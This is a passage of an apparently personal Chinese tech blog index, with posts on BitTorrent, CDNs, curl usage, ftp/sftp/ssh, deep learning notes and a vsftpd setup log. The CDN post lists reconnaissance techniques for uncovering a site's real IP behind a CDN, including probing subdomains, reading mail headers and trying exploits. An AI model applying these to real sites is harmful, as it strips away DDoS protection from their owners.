E）上面信息生成后，torrent会把A）里面的这些信息，以及torrent里面的文件名等关键信息，再进行一次Hash，生成一个新的SHA1值，作为torrent的HASH值，也就是我们经常看到的下载软件里面对这个种子命名的一个唯一的hash值，也有的在magnet这种磁力链接中可以看到这个值，这就是torrent的唯一标记。</p><p>以上就是.torrent文件的内容，可以用记事本打开，但可能看到乱码。这个文件的编码遵循了bencode编码规则。但实际内容就主要是上面这些。所以，torrent可以理解为对原始数据的一些记录。</p><h2 id="如果下载时没有其他节点在线。又没有http服务器，是不是就不能进行下载了呢？"><a href="#如果下载时没有其他节点在线。又没有http服务器，是不是就不能进行下载了呢？" class="headerlink" title="如果下载时没有其他节点在线。又没有http服务器，是不是就不能进行下载了呢？"></a>如果下载时没有其他节点在线。又没有http服务器，是不是就不能进行下载了呢？</h2><p>不一定，BT发明者提出了DHT（Distributed Hash Table）的概念，就算Tracker连不上了，也可以通过分布式哈希表DHT技术，通过DHT网络慢慢的寻找志同道合的邻居节点，只是没有Tracker那么直接那么快速，但慢一些总还是有机会找到邻居的</p><h2 id="有关下载过程中的一些事"><a href="#有关下载过程中的一些事" class="headerlink" title="有关下载过程中的一些事"></a>有关下载过程中的一些事</h2><p>文件下载时，若存在提供下载服务的http服务器，那么就算没有其他的客户端在线，下载仍然可以进行</p><p>下载过程中出现卡在99.99%的原因是因为当所有分块都下载完毕时，电脑会对下载的文件进行文件校验（类似于哈希检验），而当文件校验不通过时，电脑就会对组成文件的所有分块逐个逐个进行检验，发现校验值不对的文件分块再重新下载，这就是为什么有时候下载卡住的原因</p><p>当文件下载完毕时，如果你没有关闭下载文件的客户端，那么如果有其他人需要你的文件，即使你没有在下载文件，你所拥有的文件分块依然可以上传给其他客户端，成为一名崇高的传递者</p><p>文件下载时，影响下载速度的，除了你的电脑当前的网速，其实还有你的电脑当前的上传速度；在BT网络的带宽分配中，上传速度快的客户端能够获得的下载速度会相对比较快</p><p>某些运营商会对BT下载时的通信进行拦截，它们会对通信过程中传输的内容进行分析，由于早期的下载传输的是明文，故很容易就能够被运营商截取；当然，道高一尺，魔高一丈，如今的下载过程传输的内容大部分都进行过加密</p><blockquote><p>quote<br><a href="https://baike.baidu.com/item/BitTorrent/142795">BitTorrent_百度百科 (baidu.com)</a></p><p><a href="https://www.zhihu.com/question/49829233/answer/160765176">https://www.zhihu.com/question/49829233/answer/160765176</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有关cdn和真实ip的一些事</title>
      <link href="2022/03/20/cdn/"/>
      <url>2022/03/20/cdn/</url>
      
        <content type="html"><![CDATA[<h2 id="CDN是什么？"><a href="#CDN是什么？" class="headerlink" title="CDN是什么？"></a>CDN是什么？</h2><blockquote><p>CDN(Content Delivery Network)是指内容分发网络，也称为内容传送网络，这个概念始于1996年，是美国麻省理工学院的一个研究小组为改善互联网的服务质量而提出的。为了能在传统IP网上发布丰富的宽带媒体内容，他们提出在现有互联网基础上建立一个内容分发平台专门为网站提供服务，并于1999年成立了专门的CDN服务公司，为Yahoo提供专业服务。由于CDN是为加快网络访问速度而被优化的网络覆盖层，因此被形象地称为“网络加速器”。</p></blockquote><p>以上是来自百度百科的解释<br>个人理解，通俗点说，cdn其实就是一些服务器，将你的一些静态文件（html）什么的复制一份，然后等有人访问网站的时候再就近选择cdn服务器把你的那些静态页面返回，这样就不用通过你的服务器，从而减轻带宽负载了</p><h2 id="CDN和IP是什么关系？"><a href="#CDN和IP是什么关系？" class="headerlink" title="CDN和IP是什么关系？"></a>CDN和IP是什么关系？</h2><p>由于用户获取静态文件时大概率会由CDN服务器返回，则大多数情况下用户输入域名访问网站时，实际进行通信的很可能不是该网站真实的IP，而是CDN服务器的IP</p><h2 id="CDN的好处有哪些？"><a href="#CDN的好处有哪些？" class="headerlink" title="CDN的好处有哪些？"></a>CDN的好处有哪些？</h2><p>最明显的也是大部分人最需要的，就是减少自家服务器的带宽负载<br>此外还有一个好处，就是隐藏服务器的真实IP（但是不能百分百隐藏）</p><h3 id="CDN隐藏IP的好处是什么？为什么不能完全隐藏？"><a href="#CDN隐藏IP的好处是什么？为什么不能完全隐藏？" class="headerlink" title="CDN隐藏IP的好处是什么？为什么不能完全隐藏？"></a>CDN隐藏IP的好处是什么？为什么不能完全隐藏？</h3><p>隐藏IP最大的好处就是在一定程度上避免自家服务器受到攻击（DDoS攻击之类的），因为不法分子无法知道我们服务器的真实IP，也就无法对该IP进行大量重复的请求从而达到使网站拒绝服务的效果，最多就是把最近的CDN服务器打了下来<br>那天下CDN千千万，你把这个打下来了又有什么用呢？你又不能确保你下一个访问的服务器一定不是CDN</p><h2 id="我怎么知道自己的请求是不是到了CDN呢？"><a href="#我怎么知道自己的请求是不是到了CDN呢？" class="headerlink" title="我怎么知道自己的请求是不是到了CDN呢？"></a>我怎么知道自己的请求是不是到了CDN呢？</h2><p>想知道自己访问的服务器是不是CDN，有几种办法：<br>windows命令行用nslookup命令查询一下目标域名，如果一个域名对应着好几个IP，那十有八九是使用了CDN；当然，如果只返回了一个IP也不能说明目标网站就没有使用CDN<br>在CDN查询网站上查</p><blockquote><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p></blockquote><p>查子域名：因为大部分站长使用CDN针对的大多是首页等访问量比较大的页面，那么子页面就有可能没有使用CDN，这时候查询子页面返回的结果很有可能就是真实IP<br>漏洞利用：用CTF那套试试。不过不提倡且大部分情况下不合法<br>分析服务器返回的信息：有些网站会有邮件服务或者订阅服务之类的，而这些服务有时并不会使用CDN，通过分析邮件源码就可以得到IP<br>通过国外访问：有些CDN只面向国内的请求，对于不在服务范围的国外请求有可能不会经过CDN而直接访问真实IP<br>直接访问CDN服务器：最直接的方法就是拿到CDN服务器的账户自己上去查</p><h2 id="怎样才能有CDN服务？"><a href="#怎样才能有CDN服务？" class="headerlink" title="怎样才能有CDN服务？"></a>怎样才能有CDN服务？</h2><p>除了花钱买这一最直接的方法之外，还有另外一种能够获得CDN服务的方法，就是在租赁域名的时候很多服务提供商会免费对该域名提供CDN服务，不要白不要</p><p>以下是对我自己网站的CDN查询<br><a href="https://www.helloimg.com/image/RadpUh"><img src="https://www.helloimg.com/images/2022/03/20/RadpUh.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/20/RadpUh.png" srcset="data:image/png;base64,666" alt="RadpUh.png"></a></p><p>最后再说一句，拿到真实IP了也未必能够通过IP访问目标网站</p><blockquote><p>quote<br><a href="https://blog.csdn.net/fly_hps/article/details/98486807">https://blog.csdn.net/fly_hps/article/details/98486807</a><br><a href="https://www.cxybb.com/article/weixin_37104668/115167764">https://www.cxybb.com/article/weixin_37104668/115167764</a><br><a href="https://baike.baidu.com/item/CDN/420951">https://baike.baidu.com/item/CDN/420951</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>curl的常见用法</title>
      <link href="2022/03/12/curl/"/>
      <url>2022/03/12/curl/</url>
      
        <content type="html"><![CDATA[<p>curl用法：</p><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">GET请求：</span><br><span class="line">curl https://www.xxx.com</span><br><span class="line"></span><br><span class="line">POST请求：</span><br><span class="line">curl -d key=value https://www.xxx.com</span><br><span class="line"></span><br><span class="line">填写表单：</span><br><span class="line">curl -F key1=value1 -F key2=value2 https://www.xxx.com/xxx.cgi</span><br><span class="line"></span><br><span class="line">显示信息：</span><br><span class="line">curl -i https://www.xxx.com</span><br><span class="line"></span><br><span class="line">指定USER-AGENT</span><br><span class="line">curl -A <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.39&quot;</span> https://www.xxx.com</span><br><span class="line">注：若留空则移除User-Agent标头</span><br><span class="line"></span><br><span class="line">跟随重定向：</span><br><span class="line">curl -L https://www.xxx.com</span><br><span class="line">注：curl默认不跟随重定向</span><br><span class="line"></span><br><span class="line">发送cookie：</span><br><span class="line">curl -b <span class="string">&quot;foo=bar&quot;</span> https://www.xxx.com</span><br><span class="line"></span><br><span class="line">url编码：</span><br><span class="line">curl --data-urlencode <span class="string">&quot;xxxxxxx&quot;</span> https://www.xxx.com</span><br><span class="line">注：该方式与-d相近，区别在于是否编码</span><br><span class="line"></span><br><span class="line">保存网页(与wget相似)：</span><br><span class="line">curl -o xxx.html https://www.xxx.com</span><br><span class="line"></span><br><span class="line">用户认证：</span><br><span class="line">curl -u <span class="string">&quot;user:passwd&quot;</span> https://www.xxx.com/login</span><br><span class="line"></span><br><span class="line">输出通信过程：</span><br><span class="line">curl -v https://www.xxx.com</span><br><span class="line"></span><br><span class="line">输出二进制数据：</span><br><span class="line">curl --trace - https://www.xxx.com</span><br><span class="line">注：可配合-o导出</span><br></pre></td></tr></table></figure><blockquote><p>quote<br><a href="https://www.jianshu.com/p/fc0eb6c60816">https://www.jianshu.com/p/fc0eb6c60816</a><br><a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">https://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ftp,sftp与ssh之间的关系</title>
      <link href="2022/03/06/ftp_sftp_ssh/"/>
      <url>2022/03/06/ftp_sftp_ssh/</url>
      
        <content type="html"><![CDATA[<h2 id="ftp和sftp的区别"><a href="#ftp和sftp的区别" class="headerlink" title="ftp和sftp的区别"></a>ftp和sftp的区别</h2><p>这两种协议都是用于传输文件的，其中sftp是基于ssh的原理<a id="more"></a>开发的</p><blockquote><p>ftp: File Transfer Protocol<br>stfp: Secure File Transfer Protocol / SSH File Transfer Protocol<br>ssh: Secure Shell</p></blockquote><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><p><img src="https://www.helloimg.com/images/2021/12/16/G9aPoR.jpg" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/16/G9aPoR.jpg" srcset="data:image/png;base64,666"><br>ftp是明文传输，有两种模式：主动模式和被动模式</p><h4 id="主动模式-Positive-Mode-："><a href="#主动模式-Positive-Mode-：" class="headerlink" title="主动模式(Positive Mode)："></a>主动模式(Positive Mode)：</h4><p><a href="https://www.helloimg.com/image/Gh2qT6"><img src="https://www.helloimg.com/images/2022/03/06/Gh2qT6.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2qT6.png" srcset="data:image/png;base64,666" alt="Gh2qT6.png"></a><br><a href="https://www.helloimg.com/image/Gh2s7A"><img src="https://www.helloimg.com/images/2022/03/06/Gh2s7A.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2s7A.png" srcset="data:image/png;base64,666" alt="Gh2s7A.png"></a><br>在该模式下，服务端开放21，20端口；21端口用于接收用户名和密码，20端口用于传输数据<br>客户端登录ftp服务器后随机开放一个端口，再将这个端口的信息发送给服务端，服务端再通过用于传输数据的20端口连接至用户提供的端口</p><h4 id="被动模式-Passive-Mode-："><a href="#被动模式-Passive-Mode-：" class="headerlink" title="被动模式(Passive Mode)："></a>被动模式(Passive Mode)：</h4><p><a href="https://www.helloimg.com/image/Gh2mnz"><img src="https://www.helloimg.com/images/2022/03/06/Gh2mnz.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2mnz.png" srcset="data:image/png;base64,666" alt="Gh2mnz.png"></a><br><a href="https://www.helloimg.com/image/Gh2JPR"><img src="https://www.helloimg.com/images/2022/03/06/Gh2JPR.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2JPR.png" srcset="data:image/png;base64,666" alt="Gh2JPR.png"></a><br>在该模式下，服务端开放用于客户端连接的21端口以及一个随机端口，而客户端在登录ftp服务器后接收服务端提供的随机端口的信息，再连接至服务端的该端口以传输数据</p><h3 id="stfp"><a href="#stfp" class="headerlink" title="stfp"></a>stfp</h3><p><a href="https://www.helloimg.com/image/Gh2eqP"><img src="https://www.helloimg.com/images/2022/03/06/Gh2eqP.jpg" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2eqP.jpg" srcset="data:image/png;base64,666" alt="Gh2eqP.jpg"></a></p><blockquote><p>首先要明确的一点是，stfp是ssh的一个子服务</p></blockquote><p><a href="https://www.helloimg.com/image/Gh24C5"><img src="https://www.helloimg.com/images/2022/03/06/Gh24C5.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh24C5.png" srcset="data:image/png;base64,666" alt="Gh24C5.png"></a><br>sftp是基于ssh的技术进行文件的传输的，而ssh是通过22端口进行通信的，也就是说sftp也是通过22端口进行通信以及数据传输的，与ftp协议相比，除了通信端口的不同，由于ssh的通信过程是加密的，所以sftp中文件的传输也是加密的，但实际的安全性还取决于ssh的连接方式；且在ssh服务器与通信主机（服务器）分开时还分有半安全模式(Less Secure Connection)和安全模式(Full Secure Connection)</p><blockquote><p>半安全模式指用户通过ssh连接ssh服务器时所有的数据都是加密的，而ssh服务器与主机间通信的数据是未加密的</p></blockquote><p><a href="https://www.helloimg.com/image/Gh2xUn"><img src="https://www.helloimg.com/images/2022/03/06/Gh2xUn.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2xUn.png" srcset="data:image/png;base64,666" alt="Gh2xUn.png"></a></p><blockquote><p>安全模式指用户与ssh服务器以及ssh服务器与主机间的通信都是加密的</p></blockquote><p><a href="https://www.helloimg.com/image/Gh2At0"><img src="https://www.helloimg.com/images/2022/03/06/Gh2At0.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/06/Gh2At0.png" srcset="data:image/png;base64,666" alt="Gh2At0.png"></a><br>而当ssh服务运行于目标主机上时便不存在半安全模式和安全模式之分了</p><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><p>作为远程连接主机的常用方式，ssh有两种连接方式，一种是通过用户名和密码进行通信，这种方式非常方便，只需要任意一台能够接入互联网的常用设备就能够连接上远程主机，但是这种方式存在受到中间人攻击的可能；另一种方式是通过密钥分发的方式，即在服务端生成一份私钥存于服务器，再生成一份公钥分发给需要通信的主机，这种方式不需要用户名和密码，并且通信时需要进行密钥与公钥的验证，基本杜绝了中间人攻击的可能，但是由于需要提前准备好公钥，故便携性不如第一种方式</p><blockquote><p>quote<br><a href="https://network.51cto.com/article/603552.html">https://network.51cto.com/article/603552.html</a><br><a href="https://www.zhihu.com/question/20402010">https://www.zhihu.com/question/20402010</a><br><a href="https://blog.csdn.net/cuker919/article/details/6403925">https://blog.csdn.net/cuker919/article/details/6403925</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch 5</title>
      <link href="2021/12/25/deep_learning_from_scratch_5/"/>
      <url>2021/12/25/deep_learning_from_scratch_5/</url>
      
        <content type="html"><![CDATA[<h3 id="深度学习应用案例"><a href="#深度学习应用案例" class="headerlink" title="深度学习应用案例"></a>深度学习应用案例</h3><a id="more"></a><ul><li><p>物体检测 – R-CNN</p></li><li><p>图像分割 – FCN</p></li><li><p>图像标题的生成 – NIC (CNN+RNN)</p></li><li><p>图像风格变换</p></li><li><p>图像的生成 – DCGAN</p></li><li><p>自动驾驶</p></li><li><p>Dep Q-Network (强化学习)</p></li></ul><h3 id="多模态处理"><a href="#多模态处理" class="headerlink" title="多模态处理"></a>多模态处理</h3><blockquote><p>组合图像和自然语言等多种信息进行的处理</p></blockquote><h3 id="GAN"><a href="#GAN" class="headerlink" title="GAN"></a>GAN</h3><blockquote><p>生成式对抗网络（GAN, Generative Adversarial Networks ）是一种<a href="https://baike.baidu.com/item/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/3729729">深度学习</a><a href="https://baike.baidu.com/item/%E6%A8%A1%E5%9E%8B/1741186">模型</a>，是近年来复杂分布上<a href="https://baike.baidu.com/item/%E6%97%A0%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0/810193">无监督学习</a>最具前景的方法之一。模型通过框架中（至少）两个模块：<a href="https://baike.baidu.com/item/%E7%94%9F%E6%88%90%E6%A8%A1%E5%9E%8B/6563656">生成模型</a>（Generative Model）和<a href="https://baike.baidu.com/item/%E5%88%A4%E5%88%AB%E6%A8%A1%E5%9E%8B/16224017">判别模型</a>（Discriminative Model）的互相博弈学习产生相当好的输出。原始 GAN <a href="https://baike.baidu.com/item/%E7%90%86%E8%AE%BA/1732500">理论</a>中，并不要求 G 和 D 都是神经网络，只需要是能拟合相应生成和判别的函数即可。但实用中一般均使用深度神经网络作为 G 和 D 。 –Baidu Baike</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出、AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch 4</title>
      <link href="2021/12/18/deep_learning_from_scratch_4/"/>
      <url>2021/12/18/deep_learning_from_scratch_4/</url>
      
        <content type="html"><![CDATA[<h3 id="卷积神经网络与普通机器学习的区别"><a href="#卷积神经网络与普通机器学习的区别" class="headerlink" title="卷积神经网络与普通机器学习的区别"></a>卷积神经网络与普通机器学习的区别</h3><a id="more"></a><blockquote><p>CNN中新出现了卷积层和池化层</p></blockquote><h3 id="全连接层存在的问题"><a href="#全连接层存在的问题" class="headerlink" title="全连接层存在的问题"></a>全连接层存在的问题</h3><p>在全连接层中，传入的图像的形状信息被破坏了；由于在全连接层中，数据是以一维的形式传入的，故忽略了图像中诸如相邻像素之间的关系</p><h3 id="特征图"><a href="#特征图" class="headerlink" title="特征图"></a>特征图</h3><p>卷积层的输入输出数据。根据输入和输出分为输入特征图和输出特征图</p><h3 id="卷积运算"><a href="#卷积运算" class="headerlink" title="卷积运算"></a>卷积运算</h3><p>卷积运算是以一定的间隔滑动滤波器的窗口并对输入数据应用滤波器，应用的方式有乘积累加，偏置和求和等</p><h3 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h3><p>向输入数据的周围填入固定的数值；“幅度为1的填充”指的是向输入数据周围1个单位的范围内填充0</p><p>作用：调整输出的大小，由于在卷积运算中空间不断缩小，为了在保持输出大小不变的前提下进行卷积运算甚至深度卷积，就需要<strong>填充</strong>来调整数据空间大小</p><h3 id="步幅"><a href="#步幅" class="headerlink" title="步幅"></a>步幅</h3><blockquote><p>应用滤波器的位置间隔</p></blockquote><h3 id="3维数据的卷积运算"><a href="#3维数据的卷积运算" class="headerlink" title="3维数据的卷积运算"></a>3维数据的卷积运算</h3><p>与2维数据的卷积运算不同的是，3维数据的卷积运算同时进行多通道的卷积并将结果相加</p><h3 id="池化层"><a href="#池化层" class="headerlink" title="池化层"></a>池化层</h3><p>池化是缩小高、长方向上的空间的运算；包含Max池化和Average池化等</p><p>特征</p><ul><li>没有要学习的参数</li><li>通道数不发生变化</li><li>对微小的位置变化具有鲁棒性（健壮）</li></ul><h3 id="具有代表性的CNN"><a href="#具有代表性的CNN" class="headerlink" title="具有代表性的CNN"></a>具有代表性的CNN</h3><ul><li><p>LeNet</p><p>是进行手写数字识别的网络，具有连续的卷积层和池化层，最后经全连接层输出结果</p><p>不同点</p><ul><li><p>激活函数不同</p><p>LeNet使用sigmoid函数，而现在的CNN主要使用ReLU函数</p></li><li><p>在缩小中间数据的大小时采用的方法不同</p><p>原始的LeNet中使用子采样(subsampling)，而现在的CNN大多使用Max池化</p></li></ul></li><li><p>AlexNet</p><p>在结构上与LeNet基本没有什么不同</p><p>与LeNet的差异</p><ul><li>激活函数使用ReLU</li><li>使用进行局部正规化的LRN(Local Response Normalization)层</li><li>使用Dropout</li></ul></li></ul><h3 id="Data-Augmentation-数据扩充"><a href="#Data-Augmentation-数据扩充" class="headerlink" title="Data Augmentation(数据扩充)"></a>Data Augmentation(数据扩充)</h3><p>基于算法“人为地”扩充输入图像（训练图像），如施加旋转、垂直或水平方向上的移动等微小变化，以此增加图像的数量</p><h3 id="加深层的好处"><a href="#加深层的好处" class="headerlink" title="加深层的好处"></a>加深层的好处</h3><ul><li><p>减少网络的参数数量</p><p>与没有加深层的网络相比，加深了层的网络可以用更少的参数达到同等水平（或者更强）的表现力</p></li><li><p>使学习更加高效</p><p>随着层的加深，神经元会对更复杂的东西有响应</p></li><li><p>可以分层次地分解需要学习的问题</p></li><li><p>可以分层次地传递信息</p></li></ul><h3 id="感受野-receptive-field"><a href="#感受野-receptive-field" class="headerlink" title="感受野(receptive field)"></a>感受野(receptive field)</h3><p>给神经元施加变化的某个局部空间区域</p><h3 id="ImageNet"><a href="#ImageNet" class="headerlink" title="ImageNet"></a>ImageNet</h3><p>一个拥有超过100万张图像的数据集</p><h3 id="在深度学习中比较知名的网络"><a href="#在深度学习中比较知名的网络" class="headerlink" title="在深度学习中比较知名的网络"></a>在深度学习中比较知名的网络</h3><ul><li>VGG</li><li>GoogLeNet</li><li>ResNet</li></ul><h3 id="深度学习中高速化的问题"><a href="#深度学习中高速化的问题" class="headerlink" title="深度学习中高速化的问题"></a>深度学习中高速化的问题</h3><p>在深度学习中大部分时间都耗费在卷积层上</p><h3 id="基于GPU的高速化"><a href="#基于GPU的高速化" class="headerlink" title="基于GPU的高速化"></a>基于GPU的高速化</h3><p>深度学习中需要进行大量的乘积累加计算，而这正是GPU所擅长的，故可使用GPU来进行深度学习的运算以提高学习速度</p><h3 id="分布式学习"><a href="#分布式学习" class="headerlink" title="分布式学习"></a>分布式学习</h3><p>为了进一步提高深度学习所需的计算的速度，可以考虑在多个GPU或者多台机器上进行分布式计算</p>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出、AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ftp文件服务器搭建</title>
      <link href="2021/12/16/ftp_server/"/>
      <url>2021/12/16/ftp_server/</url>
      
        <content type="html"><![CDATA[<h2 id="第一步：更新软件列表"><a href="#第一步：更新软件列表" class="headerlink" title="第一步：更新软件列表"></a>第一步：更新软件列表</h2><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">zh@ubuntu:~$ sudo apt update</span><br><span class="line">[sudo] password for zh: </span><br><span class="line">Hit:1 http://cn.archive.ubuntu.com/ubuntu focal InRelease</span><br><span class="line">Get:2 http://cn.archive.ubuntu.com/ubuntu focal-updates InRelease [114 kB]</span><br><span class="line">Get:3 http://cn.archive.ubuntu.com/ubuntu focal-backports InRelease [108 kB]</span><br><span class="line">Get:4 http://cn.archive.ubuntu.com/ubuntu focal-security InRelease [114 kB]</span><br><span class="line">Get:5 http://cn.archive.ubuntu.com/ubuntu focal-updates/main amd64 Packages [1,397 kB]</span><br><span class="line">Get:6 http://cn.archive.ubuntu.com/ubuntu focal-updates/universe amd64 Packages [883 kB]                                       </span><br><span class="line">Fetched 2,615 kB in 10s (271 kB/s)                                                                                             </span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">49 packages can be upgraded. Run &#x27;apt list --upgradable&#x27; to see them.</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第二步：安装vsftpd"><a href="#第二步：安装vsftpd" class="headerlink" title="第二步：安装vsftpd"></a>第二步：安装vsftpd</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">zh@ubuntu:~$ sudo apt install vsftpd</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">The following additional packages will be installed:</span><br><span class="line">  ssl-cert</span><br><span class="line">Suggested packages:</span><br><span class="line">  openssl-blacklist</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  ssl-cert vsftpd</span><br><span class="line">0 upgraded, 2 newly installed, 0 to remove and 49 not upgraded.</span><br><span class="line">Need to get 132 kB of archives.</span><br><span class="line">After this operation, 402 kB of additional disk space will be used.</span><br><span class="line">Do you want to continue? [Y/n] y</span><br><span class="line">Get:1 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 ssl-cert all 1.0.39 [17.0 kB]</span><br><span class="line">Get:2 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 vsftpd amd64 3.0.3-12 [115 kB]</span><br><span class="line">Fetched 132 kB in 3s (50.0 kB/s) </span><br><span class="line">Preconfiguring packages ...</span><br><span class="line">Selecting previously unselected package ssl-cert.</span><br><span class="line">(Reading database ... 71512 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../ssl-cert_1.0.39_all.deb ...</span><br><span class="line">Unpacking ssl-cert (1.0.39) </span><br><span class="line">Selecting previously unselected package vsftpd..............................................................................] </span><br><span class="line">Preparing to unpack .../vsftpd_3.0.3-12_amd64.deb ...</span><br><span class="line">Unpacking vsftpd (3.0.3-12) ...######################.......................................................................] </span><br><span class="line">Setting up ssl-cert (1.0.39) ...#################################...........................................................] </span><br><span class="line">Progress: [ 56%] [##########################################################................................................] </span><br><span class="line">Setting up vsftpd (3.0.3-12) ...########################################################....................................] </span><br><span class="line">Created symlink /etc/systemd/system/multi-user.target.wants/vsftpd.service → /lib/systemd/system/vsftpd.service.............] </span><br><span class="line">Processing triggers for man-db (2.9.1-1) </span><br><span class="line">Processing triggers for systemd (245.4-4ubuntu3.11) ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第三步：添加用户"><a href="#第三步：添加用户" class="headerlink" title="第三步：添加用户"></a>第三步：添加用户</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zh@ubuntu:~$ sudo nano /etc/vsftpd.conf</span><br><span class="line">zh@ubuntu:~$ sudo useradd -m ftpuser</span><br><span class="line">zh@ubuntu:~$ sudo passwd ftpuser</span><br><span class="line">New password: </span><br><span class="line">Retype new password: </span><br><span class="line">passwd: password updated successfully</span><br></pre></td></tr></table></figure><h2 id="第四步：测试"><a href="#第四步：测试" class="headerlink" title="第四步：测试"></a>第四步：测试</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/zh# echo &quot;TEST&quot; &gt; ../ftpuser/test.txt</span><br></pre></td></tr></table></figure><p><a href="https://www.helloimg.com/image/G9PfZv"><img src="https://www.helloimg.com/images/2021/12/16/G9PfZv.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/16/G9PfZv.png" srcset="data:image/png;base64,666" alt="G9PfZv.png"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch 3</title>
      <link href="2021/12/11/deep_learning_from_scratch_3/"/>
      <url>2021/12/11/deep_learning_from_scratch_3/</url>
      
